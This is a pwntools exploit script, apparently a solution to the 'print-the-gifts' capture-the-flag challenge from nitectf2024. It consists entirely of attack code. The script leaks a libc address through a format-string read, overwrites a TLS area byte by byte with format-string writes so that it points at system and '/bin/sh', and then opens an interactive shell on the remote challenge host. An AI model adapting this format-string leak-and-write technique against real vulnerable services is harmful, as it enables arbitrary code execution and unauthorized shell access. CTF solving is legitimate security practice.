from pwn import *
context.binary = elf = ELF("chall_patched")
context.log_level = "debug"
libc = ELF("./libc.so.6")
p = remote("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)#process()
#gdb.attach(p)
pause()
p.sendline(b"%23$p")
p.recvuntil(b"Santa brought you a ")
libc.address = int(p.recvline().strip().decode(), 16) - 0x2724a
p.sendline(b"y")
print("LIBC FOUND: 0x%x" % libc.address)
target = libc.address - 0x2918
print("TLS TARGET: 0x%x" % target)
pay = flat(target+8, libc.sym['system'] << 17, next(libc.search(b'/bin/sh')))
p.clean()
for x in range(0, len(pay)):
    p.sendline(fmtstr_payload(8, {target + x: pay[x:x+1]}, write_size="byte"))
    p.clean(timeout=0.2)
    p.sendline(b"y")
    p.clean(timeout=0.2)
pause()
target = libc.address - 0x2890
for x in range(0, 16, 8):
    p.sendline(fmtstr_payload(8, {target + x: 0}))
    p.sendline(b"y")
p.interactive()
